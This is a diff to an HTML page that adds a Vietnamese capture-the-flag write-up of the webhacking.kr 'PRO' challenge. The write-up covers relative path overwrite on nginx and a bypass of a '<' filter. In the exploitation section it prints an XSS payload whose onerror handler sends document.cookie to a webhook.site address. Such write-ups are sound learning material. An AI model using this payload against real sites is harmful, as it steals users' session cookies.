@@ -30,30 +30,49 @@
                     <a href="#" class="link-danger text-decoration-none">tu3n4nh</a>
                 </div>
                 <p class="text-center fst-italic p-2">From KCSC with luv</p>
-            </div>
-
-            <div class="col-lg-7 bg-white mx-3 p-5 pt-lg-0 rounded-3 content ">
-                <h1 class="mt-4">webhacking.kr/PRO</h1>
-                <p class="fst-italic">
-                    link to chall: <a href="http://webhacking.kr:10011/">http://webhacking.kr:10011/</a>
-                </p>
-                <img src="./img/chall.png" class="w-100" alt="chall">
-                <h2 class="my-3">Analysic</h2>
-                <p>
-                    Lorem ipsum dolor sit, amet consectetur adipisicing elit. Rem non ullam laboriosam minima harum amet esse velit cum necessitatibus, provident excepturi. Unde nostrum rerum fugiat ab. Ratione a explicabo cupiditate!
-                </p>
-                <h2 class="my-3">Exploit</h2>
-                <p>
-                    Lorem, ipsum dolor sit amet consectetur adipisicing elit. Amet laborum quisquam vitae nobis facere expedita, culpa obcaecati quo repellat reiciendis, tempora quod sapiente? Quo sunt, voluptates quibusdam enim voluptatibus cupiditate!
-                </p>
-            </div>
-
-            <div class="col-lg-2 bg-white rounded-3 mt-2 other h-100">
+                <div class="bg-white rounded-3 mt-2 other h-100">
                 <ul class="list-group list-group-flush mt-1 mb-1">
                     <li class="list-group-item"><a href="#" class="link-success text-decoration-none">webhacking.kr/BABY</a></li>
                     <li class="list-group-item"><a href="#" class="link-success text-decoration-none">root-me.org/XSS - DOM base eval</a></li>
                 </ul>
             </div>
+            </div>
+
+            <div class="col-lg-9 bg-white mx-3 p-5 pt-lg-0 rounded-3 content ">
+                <h1 id="webhacking-pro" class="my-3">Webhacking/PRO</h1>
+                <p><img class="w-100" src="https://i.imgur.com/tID6kV4.png" alt=""></p>
+                <p>Link to chall: <a href="http://webhacking.kr:10011/">http://webhacking.kr:10011/</a></p>
+                <h2 id="ph-n-t-ch">Phân tích</h2>
+                <p>Sau khi vào trang web ngoài trừ <code>report</code> page thì không thể bấm vào được đâu để test tính năng của web nữa, nên em đã ctrl u để đọc source code:</p>
+                <p><img class="w-100" src="https://i.imgur.com/LvdBUiS.png" alt=""></p>
+                <p>Em thấy website sử dụng XMLHttpRequest để call api tới <code>api.php/search + một từ trong mảng location[]</code></p>
+                <p><img class="w-100" src="https://i.imgur.com/DLM6MYh.png" alt=""></p>
+                <p>Call thử api theo đường link đó và em thấy server trả về cho em một object chứa đúng thông tin mà website sử dụng để hiện thị khi trỏ chuột vào <code>hoth</code>.</p>
+                <p>Có lẽ đây là vị trí truyền dữ liệu duy nhất mà chúng ta kiểm soát.</p>
+                <p>Em bắt đầu chèn thử một vài path bất kỳ: </p>
+                <p><img class="w-100" src="https://i.imgur.com/8R80OoU.png" alt=""></p>
+                <p><img class="w-100" src="https://i.imgur.com/mL1ZgPL.png" alt=""></p>
+                <p><img class="w-100" src="https://i.imgur.com/GhUr5kO.png" alt=""></p>
+                <p>Sau khi thử vài lần em xác định được web server là nginx, dấu ngoặc &lt; &gt; và các ký tự trong nó đều bị filter.</p>
+                <p>Thực sự thì rất là bế tắc. Sau khi đi xin hint thì em được hint đây là lỗi RPO, bắt đầu đi tìm hiểu về lỗi này. Sau một hồi tìm doc thì chúng ta có thể thực hiện tất công rpo với web server nginx bằng url decoding</p>
+                <h2 id="khai-th-c">Khai thác</h2>
+                <p>Em bắt đầu bằng việc tạo một result giả để thay cho XMLHttpRequest() được gọi: <code>{&quot;results&quot;:[{&quot;name&quot;:&quot;a&quot;,&quot;terrain&quot;:&quot;a&quot;,&quot;population&quot;:&quot;a&quot;,&quot;diameter&quot;:&quot;1&quot;}]}</code></p>
+                <p>Nếu chỉ để như vậy thì đoạn dữ liệu trả về sẽ kèm theo not found:</p>
+                <p><img class="w-100" src="https://i.imgur.com/TxSlime.png" alt=""></p>
+                <p>Để xóa được chữ not found em dựa vào việc web filter ký tự &lt; &gt; và dữ liệu bên trong nó nên em đã thêm vào payload <code>&lt;a</code>: <code>{&quot;results&quot;:[{&quot;name&quot;:&quot;a&quot;,&quot;terrain&quot;:&quot;a&quot;,&quot;population&quot;:&quot;a&quot;,&quot;diameter&quot;:&quot;1&quot;}]}&lt;a</code></p>
+                <p>Và thế là chữ not found đã biến mất:</p>
+                <p><img class="w-100" src="https://i.imgur.com/eWpbAcN.png" alt=""></p>
+                <p>Giờ đến RPO: <code>http://webhacking.kr:10011/api.php/search/{&quot;results&quot;:[{&quot;name&quot;:&quot;a&quot;,&quot;terrain&quot;:&quot;a&quot;,&quot;population&quot;:&quot;a&quot;,&quot;diameter&quot;:&quot;1&quot;}]}&lt;a/..%2f..%2f..%2f</code> </p>
+                <p>Vì web server là nginx nên khi em encode ký tự <code>/</code> thành <code>%2f</code> nên server sẽ không decode nhưng payload đó được thực hiện trong js và nó sẽ hiểu đoạn payload của em như sau: <code>http://webhacking.kr:10011/api.php/search/{&quot;results&quot;:[{&quot;name&quot;:&quot;a&quot;,&quot;terrain&quot;:&quot;a&quot;,&quot;population&quot;:&quot;a&quot;,&quot;diameter&quot;:&quot;1&quot;}]}&lt;a/../../../api.php</code></p>
+                <p>Và kết quả em nhận được là: </p>
+                <p><img class="w-100" src="https://i.imgur.com/xp6RKbT.png" alt=""></p>
+                <p>Đã RPO thành công giờ em cần XSS lấy cookie admin nhưng vấn đề ở đây là ký tự &lt; đã bị filter và web sẽ xóa hết những gì giữa &lt; và &gt; vậy nên giờ em phải bypass ký tự &lt;, và sau 1 hồi tìm kiếm thì em sử dụng unicode và url encode để bypass ký tự <code>&lt;</code> = <code>%5cu003c</code>:</p>
+                <p>Payload: <code>{&quot;results&quot;:[{&quot;name&quot;:&quot;%5cu003cimg src=a onerror=location.href=&#39;https://webhook.site/19f12290-974f-4ea8-9e5b-84af2806beff?c=&#39;+document.cookie&gt;&quot;,&quot;terrain&quot;:&quot;a&quot;,&quot;population&quot;:&quot;a&quot;,&quot;diameter&quot;:&quot;1&quot;}]}&lt;a/..%2f..%2f..%2f</code></p>
+                <p>Và vẫn giống như chall trước T.T em tự test trên trình duyệt thì được nhưng khi report cho admin thì chờ mãi không thấy cookie của admin đâu :cry: </p>
+                <p><img class="w-100" src="https://i.imgur.com/ttoIt2w.png" alt=""></p>
+
+            </div>
+
         </div>
 
     </div>
